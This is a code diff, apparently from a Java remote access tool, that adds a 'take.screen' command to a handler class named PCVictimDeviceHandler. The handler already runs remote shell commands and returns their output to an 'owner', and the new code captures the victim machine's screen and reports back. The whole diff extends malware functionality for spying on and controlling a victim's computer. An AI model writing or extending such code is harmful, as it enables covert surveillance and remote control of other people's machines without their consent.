@@ -156,6 +156,14 @@ public class PCVictimDeviceHandler extends ChannelInboundHandlerAdapter {
                     e.printStackTrace();
                 }
                 break;
+            case "take.screen":
+                path = (String) message.get("path");
+                code = "success";
+                if (!PCVictimDevice.takeScreen(path))
+                    code = "error";
+
+                sendTakeScreen(code, (String) message.get("owner"));
+                break;
         }
     }
 
@@ -211,6 +219,14 @@ public class PCVictimDeviceHandler extends ChannelInboundHandlerAdapter {
         query.put("action", "cmd");
         query.put("out", out);
         query.put("errorOut", errorOut);
+        query.put("owner", owner);
+        sendMessage(query);
+    }
+
+    private void sendTakeScreen(String code, String owner) {
+        JSONObject query = new JSONObject();
+        query.put("action", "take.screen");
+        query.put("code", code);
         query.put("owner", owner);
         sendMessage(query);
     }
